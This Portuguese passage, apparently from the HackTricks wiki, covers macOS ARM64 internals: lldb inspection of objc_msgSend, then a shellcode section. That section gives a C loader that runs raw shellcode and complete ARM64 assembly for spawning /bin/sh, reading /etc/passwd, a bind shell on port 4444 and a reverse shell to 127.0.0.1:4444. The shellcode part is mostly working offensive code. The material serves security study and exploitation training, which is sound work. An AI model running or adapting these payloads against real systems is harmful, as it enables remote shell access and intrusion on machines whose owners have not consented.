Portanto, se você colocar um breakpoint antes do branch para esta função, você pode facilmente descobrir o que é invocado no lldb com (neste exemplo, o objeto chama um objeto de `NSConcreteTask` que executará um comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
Definindo a variável de ambiente **`NSObjCMessageLoggingEnabled=1`** é possível registrar quando esta função é chamada em um arquivo como `/tmp/msgSends-pid`.

Além disso, configurando **`OBJC_HELP=1`** e chamando qualquer binário, você pode ver outras variáveis de ambiente que poderia usar para **registrar** quando certas ações Objc-C ocorrem.
{% endhint %}

Quando esta função é chamada, é necessário encontrar o método chamado da instância indicada, para isso são feitas diferentes buscas:

* Realizar uma busca otimista no cache:
  * Se bem-sucedido, concluído
* Adquirir runtimeLock (leitura)
* Se (realize && !cls->realized) realizar classe
* Se (initialize && !cls->initialized) inicializar classe
* Tentar cache próprio da classe:
  * Se bem-sucedido, concluído
* Tentar lista de métodos da classe:
  * Se encontrado, preencher cache e concluir
* Tentar cache da superclasse:
  * Se bem-sucedido, concluído
* Tentar lista de métodos da superclasse:
  * Se encontrado, preencher cache e concluir
* Se (resolver) tentar resolver método e repetir a partir da busca da classe
* Se ainda estiver aqui (= tudo o mais falhou) tentar encaminhador

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para macOS mais recentes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Código C para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Retirado de [**aqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.

{% tabs %}
{% tab title="com adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="com pilha" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="com adr para linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}
{% endtabs %}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (o que na memória significa uma pilha de endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando com sh a partir de um fork para que o processo principal não seja encerrado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Shell de Conexão

Shell de conexão em [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell reverso

De [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell para **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{% hint style="success" %}
Aprenda e pratique AWS Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Treinamento AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Treinamento GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
